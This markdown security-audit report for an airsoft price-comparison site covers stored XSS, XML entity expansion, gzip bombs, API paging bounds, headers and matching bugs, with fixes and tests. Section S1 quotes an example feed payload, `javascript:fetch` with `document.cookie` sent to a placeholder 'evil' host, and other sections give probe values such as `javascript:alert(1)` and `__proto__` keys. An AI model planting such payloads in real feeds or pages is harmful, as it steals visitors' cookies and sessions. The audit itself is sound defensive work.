# Code audit – November 2026

Branch: `audit/security-and-fixes` (based on `master` at `5ee7a26`).

> **Two versions of the site.** The audit was done on `59d2ba4`, where the site was a FastAPI
> server (`web.py` + Jinja templates). Since `5ee7a26` the live site is a static export
> (`export.py` + `static/app.js`) on Cloudflare Pages. `serve` still runs the FastAPI version.
> * Everything about reading shop data (S1 data reading, S2, S3, B1–B3, B5, B6, B8) applies
>   to both, because both use the same database.
> * **S1 (templates), S4 and S5 only fix the FastAPI version.** The static site is hardened
>   separately in PR 2 (`fix/static-site-hardening`, see "Static site (Cloudflare Pages)").
> * **S4 does not apply to Cloudflare Pages.** The static site has no API, only pre-built JSON files.
Nothing here is merged. The owner decides what to take.

The changes are split into commits by topic. Every commit passes its own tests.

| # | Commit | Findings |
|---|--------|----------|
| 1 | Treat shop data as untrusted: safe URLs, no XML entities, size caps | S1 (data reading), S2, S3, B2, B3, B8 |
| 2 | Give colliding product groups distinct ids | B1 |
| 3 | Web: sanitise stored URLs, bound API paging, add security headers | S1 (templates), S4, S5, B4, B7 |
| 4 | Warn when an offer's currency has no exchange rate | B6 |
| 5 | Add regression tests for the audit fixes | tests for 1–4 |
| 6 | Hide offers of shops removed from or disabled in shops.yaml | B5 and its tests |
| 7 | Document the audit | this file, README |

Commit 6 is the only change in behaviour that is a judgement call. It comes after the others,
so you can leave it out with `git revert <commit 6>`, or merge up to commit 5 and the docs only.
Commits 1–5 do not depend on it.
Without commit 6, B5 stays open and the suite has 31 tests instead of 34.

## Summary

| ID | Severity | Area | Problem | Status |
|----|----------|------|---------|--------|
| S1 | High | Security | Stored XSS: a feed can put `javascript:` links on the "Go to shop" button | Fixed |
| S2 | Medium | Security | XML entity expansion ("billion laughs") in feeds and sitemaps | Fixed |
| S3 | Medium | Security | No size limit on downloads or on unpacking `.gz` (memory exhaustion) | Fixed |
| S4 | Medium | Security | `/api/products?limit=-1` returns the whole database; a huge `page` gives HTTP 500 | Fixed |
| S5 | Low | Security | No basic security headers (clickjacking, MIME sniffing, referrer leaks) | Fixed |
| B1 | Medium | Matching | Two products could get the same ID: one disappeared and its offers showed on the other | Fixed |
| B2 | Low | Matching | GTIN-14 `0…` and the same EAN-13 were not treated as equal | Fixed |
| B3 | Low | Crawling | Relative image URLs from microdata / OpenGraph were stored as-is, so images were broken | Fixed |
| B4 | Low | Web | `?pmin=nan` silently returned no results | Fixed |
| B5 | Medium | Updates | Shops removed from `shops.yaml` or set to `enabled: false` stayed on the site | Fixed (behaviour change) |
| B6 | Low | Updates | Offers in a currency missing from `exchange_rates` vanished with no message | Fixed (warning) |
| B7 | Low | Web | Price labels hard-coded to CZK even when `base_currency` is something else | Fixed |
| B8 | Medium | Crawling | A sitemap with an XML comment inside it crashed that shop's crawl | Fixed |
| R1–R17 | – | – | Problems found but not changed. Each needs a decision by the owner | See [Recommendations](#recommendations-not-changed) |

Verification: the test suite went from 11 to 34 tests (36 with the static-site branch), and all of them pass. The demo
data (`python -m airsoftcompare demo`) produces **identical** products (same IDs, shop counts
and categories) before and after the change. The site was started locally and every page
and API route was checked with `curl`.

## How the audit was done

1. Read the whole code base (about 2,400 lines): data sources, matching, updater, web app and templates.
2. Wrote a small script that reproduces each suspected bug against `master` before fixing
   anything. S1, S2, B1, B2 and B3 all reproduced, for example:
   ```
   1 url: javascript:alert(1)          # feed link stored unchanged
   2 entity len: 1000                  # 3-level entity expanded 100× (each level adds 10×)
   3 ean: 05902543178017 5902543178017 # same product, two different EANs
   4 img: /i.jpg                       # relative image path stored
   5 groups->products: 2 rows: 1       # two groups, one product row, offers share its id
   ```
3. Fixed each problem and added a regression test in `tests/test_audit.py`.
4. Checked that matching results on the demo data did not change.
5. Had the diff reviewed by a second, independent reviewer before committing. Its first round
   found one more gap in S3 (robots.txt was downloaded without a cap) and some smaller issues.
   All of them are fixed below, and B8 turned up while writing their tests.

---

## Findings and fixes

Line numbers refer to `59d2ba4`, the version that was audited.

### S1 – Stored XSS via shop URLs (High)

**Where:** `sources/feed.py:47` (offer URL), `sources/sitemap.py:102,155,211` (images),
`templates/product.html:53`, `_card.html`, `shops.html`.

**Problem:** offer URLs and image URLs come straight from the shops' feeds and pages and were
written into `href` / `src`. Jinja's auto-escaping stops HTML injection but **not** a
`javascript:` URL. A feed item like `<URL>javascript:fetch('//evil/?c='+document.cookie)</URL>`
(from a compromised or malicious shop, or a hijacked feed host) would run in a visitor's browser
when they click "Go to shop".

**Fix:**
* New `safe_url(value, base=None)` in `sources/common.py`. It resolves relative URLs against
  `base` and returns the URL only when it is absolute `http`/`https` with a host, otherwise `None`.
* Used when reading data: feed items without a safe link are skipped, and unsafe images are dropped.
* Used again in the templates as a `|safe_url` filter. This covers rows already in existing
  databases, which were saved before the check existed. An unsafe link becomes `#`.
* "Go to shop" links also get `rel="noreferrer"`.

**Side effect:** feed items whose `<URL>` is relative are now skipped. The Heureka and Google
feed formats require absolute URLs, so this should not affect real shops.

**Tests:** `test_safe_url`, `test_feed_drops_script_links_and_images`,
`test_product_page_neutralises_stored_script_urls`.

### S2 – XML entity expansion (Medium)

**Where:** `sources/feed.py:69`, `sources/sitemap.py:38`.

**Problem:** both parsers use `huge_tree=True`, which large feeds need. That option also turns
off libxml2's protection against nested entity expansion. A feed or sitemap with a small DTD
can expand into gigabytes and kill the process. Reproduced: a 3-level entity grew 100-fold.

**Fix:** `resolve_entities=False, no_network=True, load_dtd=False` on both parsers.
`huge_tree` stays, so big feeds still parse. Real feeds do not use custom entities. Standard
ones like `&amp;` are unaffected.

**Tests:** `test_feed_does_not_expand_entities`, `test_sitemap_does_not_expand_entities`.

### S3 – Unbounded downloads and gzip bombs (Medium)

**Where:** `sources/common.py:152` (`session.get` reads the whole body), `:167` (`gzip.decompress`).

**Problem:** a misbehaving server, or a small `.gz` sitemap that unpacks to many GB, could
use up all memory. That matters on a small Railway instance, where the crawler and the
web server share one process.

**Fix:** responses are streamed and refused above `MAX_DOWNLOAD_BYTES`. A server that announces
a larger `Content-Length` is refused before anything is downloaded. The same limit applies
to unpacked `.gz` data. A truncated or corrupt `.gz` is now logged and skipped, where before
it aborted the whole shop. Chunks are joined once, so memory use stays close to one copy of
the body.

The download limit is **256 MB**. That is our own choice, not a documented value: it is well
above the largest Czech airsoft feeds (a few tens of MB). If a shop ever exceeds it, the log
says so and the limit is one constant in `common.py`.

`robots.txt` goes through the same capped download, with a limit of **512 KiB**
(`MAX_ROBOTS_BYTES`). RFC 9309 §2.5 asks crawlers to parse at least 500 KiB. A larger file is
cut to its first 512 KiB rather than ignored, so its rules still apply. The cut-off last line
is dropped too: `Allow: /shop/x` cut short to `Allow: /` would otherwise allow everything.
This matters because a sitemap can list URLs on any host, and the crawler reads each host's
robots.txt.

**Tests:** `test_gunzip_cap`, `test_fetcher_caps_body_and_keeps_small_ones`,
`test_robots_txt_is_capped`, `test_truncated_robots_drops_partial_last_line`,
`test_broken_gzip_does_not_raise`.

### S4 – API paging bounds (Medium)

**Where:** `web.py:148` (and `index`'s `page`).

**Problem:** `limit` had a maximum but no minimum. In SQLite, `LIMIT -1` means "no limit",
so `/api/products?limit=-1` returned every product in one response. That is an easy way to
scrape the site or load the server. A huge `page` made `OFFSET` overflow SQLite's 64-bit
integer, which gave HTTP 500.

**Fix:** `limit` must be 1–500, and `page` must be 1–10,000 (`MAX_PAGE`, our own limit).
Out-of-range values get HTTP 422.

**Test:** `test_api_rejects_unbounded_limit_and_page`.

### S5 – Security headers (Low)

**Fix:** a small middleware adds `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`
and `Referrer-Policy: strict-origin-when-cross-origin`. It sets each header only if it is
missing, so a proxy can override them. There is no Content-Security-Policy yet, see R6.

### B1 – Product ID collisions (Medium)

**Where:** `matching.py:148`.

**Problem:** a product ID is a hash of its smallest EAN or, without an EAN, its
alphabetically first normalised title. Two groups can have the same title and still be kept
apart: either the shops filed them in different categories, or the same shop lists both (the
"same shop = variants" rule). Both groups then got the same ID. `INSERT OR REPLACE` kept only
one product row, but the offers of **both** groups pointed at it. The result was one product
missing and the other showing a wrong shop count and wrong offers.

**Fix:** groups are processed in a fixed order (by smallest offer id). When an ID is already
taken, the smallest offer id is added to the hash. IDs that did not collide are **unchanged**,
so existing links and bookmarks keep working.

**Test:** `test_groups_with_same_anchor_get_distinct_ids` (also checks that the IDs stay the same between runs).

### B2 – GTIN-14 vs EAN-13 (Low)

**Where:** `sources/common.py:80`.

**Problem:** `05902543178017` (a GTIN-14 with a leading zero) and `5902543178017` (EAN-13)
are the same product. They were stored differently, so EAN matching missed them.

**Fix:** leading zeros are stripped first, then the value is padded to 13 digits. A real
14-digit GTIN that does not start with 0 is left as it is.

**Test:** `test_gtin14_with_leading_zero_equals_ean13`.

### B3 – Relative image URLs (Low)

**Where:** `sources/sitemap.py:155,211`.

**Problem:** JSON-LD images were already resolved against the page URL, but microdata
`itemprop="image"` and `og:image` were not. `/img/x.jpg` was then loaded from *our* site and
did not show.

**Fix:** all three go through `safe_url(..., page_url)`.

**Tests:** `test_microdata_relative_image_is_absolute`, `test_og_relative_image_is_absolute`.

### B4 – `nan` / `inf` in price filters (Low)

**Where:** `web.py:164`.

**Problem:** `float("nan")` parses without error, and `p.min_price >= NaN` is never true, so the
page showed "Nothing matches".

**Fix:** values that are not finite are ignored, the same way as text that is not a number.

**Test:** `test_nan_price_filter_is_ignored`.

### B5 – Removed / disabled shops stayed visible (Medium, behaviour change)

**Where:** `updater.py` (`update_all`), `web.py:113` and the `/shops` page.

**Problem:** `config.load` drops shops with `enabled: false`, but their offers in the database
stayed `active = 1`. They kept showing in products and prices, and on the Shops page, with an
"Up to date" label that was no longer true.

**Fix:**
* `update_all` calls the new `_hide_unlisted_shops()`. It sets `active = 0` on offers of shops
  not in the current config. **Nothing is deleted.** If the config lists no shops at all, which
  usually means a broken `shops.yaml`, nothing is hidden and a warning is logged. Re-enabling the shop sets the offers
  back to active on its next update, as before.
* The web app lists only shops that are in the config: the filter list, the Shops page and
  the shop count.

The SQL uses `IN (?, ?, …)` placeholders built from the number of names. The shop names are
always passed as parameters and never put into the SQL text.

**Tests:** `test_update_hides_offers_of_unlisted_shops`, `test_disabled_shops_are_not_listed`,
`test_empty_shop_list_hides_nothing`.

**Limit:** the web process reads the shop list at startup. After editing `shops.yaml`, restart
it, or let the next update hide the offers.

**If the owner does not want this:** skip that commit. The other fixes do not depend on it.

### B6 – Missing exchange rate went unnoticed (Low)

**Where:** `updater.py` `save_offer`.

**Problem:** offers in a currency without an entry in `exchange_rates` got `price_base = NULL`
and were left out of matching, with no message.

**Fix:** one warning per currency per process, for example:
`No exchange rate for HUF in settings.exchange_rates; such offers are not compared.`
The currency string comes from the shop. A value that is not a 3-letter code is not printed in
full, which stops log injection through newlines. At most 50 distinct currencies are warned
about (our own limit), so a hostile feed cannot flood the log.

**Tests:** `test_unknown_currency_warns_once`, `test_invalid_currency_not_echoed`.

### B7 – Hard-coded CZK in templates (Low)

**Where:** `templates/index.html:48`, `templates/product.html:52`.

**Fix:** the price filter label and the "original currency" note on the product page now use
`base_currency`. With the default CZK nothing looks different ("Kč" stays). The note is also
skipped when the original price is missing, which used to raise an error.

### B8 – Comments in sitemaps crashed the crawl (Medium)

**Where:** `sources/sitemap.py:44`.

**Problem:** `root.iter()` also returns comments and processing instructions, and
`etree.QName()` raises `ValueError` on those. A sitemap like
`<urlset><!-- generated by … --><url>…` (some plugins write this) stopped that shop's update with
an error. The reviewer's entity test found this: the S2 fix makes unresolved entities appear as
nodes of the same kind.

**Fix:** `root.iter(etree.Element)` visits only real elements.

**Tests:** `test_sitemap_with_comment_is_read`, `test_sitemap_does_not_expand_entities`.

---

## Static site (Cloudflare Pages)

Branch `fix/static-site-hardening`, stacked on `audit/security-and-fixes`.

Since `5ee7a26` the live site is static. `export.py` writes JSON, and `static/app.js` renders
it in the browser. The FastAPI fixes (S1 templates, S4, S5) don't reach it, so it needs its own.

### P1 – XSS in the static site (High)

**Where:** `static/app.js:191` (`href="${esc(o.u)}"`), plus the product images (`p.i`) and the
shop links (`s.url`).

**Problem:** `esc()` escapes HTML but lets `javascript:` URLs through. The database lives in the
GitHub Actions cache and was filled before the S1 checks existed, so it can still hold such
URLs. `export.py` copied them into the JSON unchanged.

**Fix, in two layers:**
1. `export.py` passes every offer URL, product image and shop URL through `safe_url()`. An
   unsafe offer is left out (and the log says how many). An unsafe image becomes no image. An
   unsafe shop URL becomes a shop with no link.
2. `app.js` has a new `safeUrl()`, which accepts only absolute `http:`/`https:` URLs parsed
   with `new URL()`. It is used on every `href`/`src` that comes from data (`o.u`, `p.i`,
   `s.url`). An unsafe link becomes `#`, and an unsafe image is not shown. This covers JSON
   from an older export that is still cached. Shop links now have `rel="noopener noreferrer nofollow"`.

**Limit:** when an offer is left out, the product's shop count and price range in `products`
still include it, until the next update re-matches. The page then shows e.g. "In stock at 3 of
4 shops" with three offers listed. A feed shop corrects itself on its next update, because the
unsafe row is no longer refreshed and so it is deactivated. A crawled shop corrects itself
within 7 days.

### P2 – Security headers and CSP (Medium)

**Where:** `export.py`, which writes `dist/_headers`. The workflow deploys `dist` with
`wrangler pages deploy dist`.

**Fix:** `_headers` now sends these on `/*`: `X-Content-Type-Options: nosniff`,
`X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, and this
Content-Security-Policy:

```
default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com;
font-src https://fonts.gstatic.com; img-src 'self' https: data:; connect-src 'self';
object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
```

The policy matches what the site actually loads: its own JS, CSS and JSON, Google Fonts, shop
product images over https, and the `data:` emoji favicon. The existing `Cache-Control` rules
are kept. To avoid needing `'unsafe-inline'`:
* `window.SITE` moved from an inline `<script>` into the generated `static/site.js`.
* The `onerror=` / `onchange=` attributes were replaced by two listeners in `app.js`: broken
  images are removed, and `data-autosubmit` controls submit their form when changed.
* The chart legend's `style="background:…"` became a small SVG swatch.

**Cloudflare Web Analytics:** if it is switched on in the Pages project, Cloudflare injects a
script from `static.cloudflareinsights.com` that reports to `cloudflareinsights.com`. The
CSP blocks both without any error the visitor sees. To use it, add
`https://static.cloudflareinsights.com` to `script-src` and `https://cloudflareinsights.com`
to `connect-src` in `SECURITY_HEADERS`.

**Limit:** shop images over plain `http:` are blocked by `img-src … https:`. The category icon
shows instead. Czech shops serve images over https, so this has not come up.

### How it was checked
* Tests in `tests/test_export.py`: export leaves out `javascript:` URLs from an old database,
  `_headers` contains every header, and the pages have no inline scripts or handlers.
* Ran `demo` and planted `javascript:` URLs in the database (offer, product image, shop),
  then exported. The JSON contained none of them, and the log said
  `Left out 1 offers whose link is not an http(s) URL`.
* Served the export with a small local server that applies `_headers` and the `/product/*`
  rewrite, as Cloudflare Pages does. Then opened it in headless Chromium: home, category
  listing, filtered listing, shops, product, unknown product.
  * No CSP violations, console errors or `javascript:`/`data:` links.
  * Inter loaded from Google Fonts.
  * The checkbox and the shop dropdown submit the form.
  * A broken image is removed.
* Wrote `javascript:` URLs straight back into the exported JSON. `app.js` still rendered no unsafe link.
* Not checked on the real Cloudflare Pages; see the PR description.

---

## Recommendations (not changed)

These need a decision, or they are larger than an audit fix.

| ID | Topic | Detail | Suggested action |
|----|-------|--------|------------------|
| R1 | robots.txt errors | `common.py:139`: when `robots.txt` cannot be read, the crawler treats it as "allow everything". That covers network errors, timeouts and any non-200 status. This was the same on `master`. RFC 9309 §2.3.1.3–2.3.1.4 says 4xx means allow but a 5xx or unreachable server means a full disallow. | Treat 5xx and network errors as disallow and retry later. |
| R2 | Rate-limit replies | HTTP 429 / 503 and `Retry-After` are ignored. The crawler just keeps going at `request_delay`. | Back off per host when you get 429. |
| R3 | Off-site sitemap URLs | A shop's sitemap (or its robots.txt) can list URLs on other hosts, and the crawler fetches them. The risk is low, because requests are polite and read-only. | Optionally allow only the shop's own host (plus `www.`). |
| R4 | Price parsing ambiguity | `parse_price("12.990")` returns 12990. That is right for HTML text but wrong for schema.org data, where `.` is always the decimal point (`price: "12.990"` would mean €12.99). | For JSON-LD and microdata `content`, try `float()` first. Not changed, because some Czech shops may put thousands separators in JSON-LD. Check against real pages first. |
| R5 | One shared DB connection | The web app uses one `sqlite3` connection from all FastAPI worker threads. This is safe with SQLite's default serialized mode, but it puts all reads in a single queue. | Open one connection per thread (`threading.local`) when traffic grows. |
| R6 | Content-Security-Policy | No CSP header, because of inline `onerror=` and `<script>` and Google Fonts. | Move inline JS into `static/`, then add a CSP header. |
| R7 | Google Fonts and GDPR | Loading Inter from `fonts.googleapis.com` sends each visitor's IP address to Google. In 2022 a German court (LG München, 3 O 17493/20) ruled this a GDPR violation. | Host the font file in `static/` instead. |
| R8 | Re-crawl skipping | `updater.py:71`: the "fresh" set holds stored URLs, which are *canonical*, but it is checked against *sitemap* URLs. When they differ, a page is downloaded again on every run. | Also store the sitemap URL, or compare after canonicalising. |
| R9 | Renaming a shop | The `shops` table is keyed by name. Renaming a shop in `shops.yaml` creates a new shop and the old one loses its price history. Since B5, at least the old shop is hidden. | Add a stable `id:` key per shop in `shops.yaml`. |
| R10 | Dependencies | Versions are only lower bounds (`>=`), and test tools are in the runtime `requirements.txt`. | Add a lock file (e.g. `pip-compile`) and a `requirements-dev.txt`. |
| R11 | CI | There is no automated test run. | A GitHub Actions workflow that runs `pytest` on every push or PR. Not added, because it needs a token with `workflow` scope and is the owner's choice. |
| R13 | SSRF and slow servers | A sitemap `<loc>` or a redirect can point at internal addresses (`127.0.0.1`, cloud metadata). The read timeout also applies to each socket read separately, so a server that sends one byte at a time can hold a worker indefinitely. | Allow only public IPs for crawled hosts, and add an overall deadline per request. |
| R14 | Product IDs when groups collide | If B1's tie-break offer becomes inactive, two colliding groups can swap IDs. A bookmark would then open the other product. This only affects groups that collide, which are rare. | Store the IDs that have been issued, if fully stable links matter. |
| R15 | Disabled shops on the static site | `export.py` lists every shop in the database in `meta.json`, including shops removed from `shops.yaml`. B5 hides their offers, but the shop itself still appears on the Shops page and in the filter. | Pass the configured shop names into `export_site` and filter `shops` the way `web.py` does. |
| R16 | Product page crash on a missing original price | `app.js` `product()`: `o.r.toFixed(2)` throws when an offer is in another currency and `o.r` is null, and the whole page then shows "Couldn't load the data". This is rare in practice. It existed before the static-site PR. | `o.y && o.y !== CUR && o.r != null`. |
| R17 | Prototype keys in URL parameters | `?cat=__proto__`, `?cat=constructor` or `/product.html?id=__proto__` reach `GROUPS[c]` / `GROUP_OF[c]` / `shard[id]` and give an error page. This is not XSS. It existed before the static-site PR. | `Object.hasOwn(...)`, or build the maps with `Object.create(null)`. |
| R12 | Speed of `_refresh_titles` | Every update re-normalises and re-categorises **all** stored offers. That is fine at tens of thousands, but slow beyond that. | Only re-run it when the code or config that cleans titles changes (e.g. store a hash of those rules). |

## Reviewing and testing this branch

```bash
git fetch origin
git checkout audit/security-and-fixes
python -m venv .venv && . .venv/bin/activate      # fish: source .venv/bin/activate.fish
pip install -r requirements.txt
python -m pytest -q                               # expect: 34 passed (36 on fix/static-site-hardening)
python -m airsoftcompare demo
python -m airsoftcompare -c demo/shops.yaml serve # http://127.0.0.1:8000
```

To compare with `master`: `git diff master...audit/security-and-fixes`.

**Upgrading an existing database:** no schema change and no migration. On the first
`update` after deploying, B5 hides offers of shops that are no longer configured. Old unsafe
URLs are made harmless at display time (S1) and get replaced by clean ones on the next
update of that shop.

**Rolling back:** deploy `master` again. None of the changes alter the database layout. The
only thing written to the DB is `active = 0` for unlisted shops, and their next update
reverses it.
